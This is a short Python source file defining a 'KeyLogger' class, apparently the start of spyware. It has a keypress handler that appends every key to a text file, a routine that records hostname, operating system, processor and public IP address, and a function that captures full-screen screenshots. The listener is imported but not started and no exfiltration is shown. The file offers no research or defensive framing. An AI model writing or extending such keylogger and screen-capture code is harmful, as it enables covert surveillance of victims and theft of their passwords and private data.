from pynput.keyboard import Listener
import socket
import platform
import requests
from PIL import ImageGrab
from pathlib import Path
import os


LOGGER_OUTPUT = "logger.txt"
COMPUTER_INFORMATION = "computer_information.txt"
SCREENSHOT_DIRECTORY = "screenshots"

if not os.path.exists("screenshots"):
    os.mkdir("screenshots")


class KeyLogger:
    def __init__(self, interval=0):
        self.LOGGER_OUTPUT = "logger.txt"
        self.COMPUTER_INFORMATION = "computer_information.txt"
        self.SCREENSHOT_DIRECTORY = "screenshots"
        self.interval = interval
    
    def on_press(self, key):
        with open(self.LOGGER_OUTPUT, "a") as f:
            f.write(f"{key} ")

    def get_computer_information(self):
        with open(self.COMPUTER_INFORMATION, "a") as f:
            hostname = socket.gethostname()

            try:
                public_ip = requests.get("https://api.ipify.org?format=json").json()
                f.write(f'\nPublic IP: {public_ip["ip"]}\n')
            except:
                f.write(f'\nPublic IP: Could not be retrieved\n')
                
            f.write(f'Hostname: {hostname}\n')
            f.write(f'Operating System: {platform.system()} {platform.version()}\n')
            f.write(f'Processor: {platform.processor()}\n')

    def take_screenshot(self):
        screenshot = ImageGrab.grab()
        screenshot.save(f"{Path(__file__).parent.joinpath(self.SCREENSHOT_DIRECTORY)}/screenshot.png")
    
    def run(self):
        self.get_computer_information()
        self.take_screenshot()
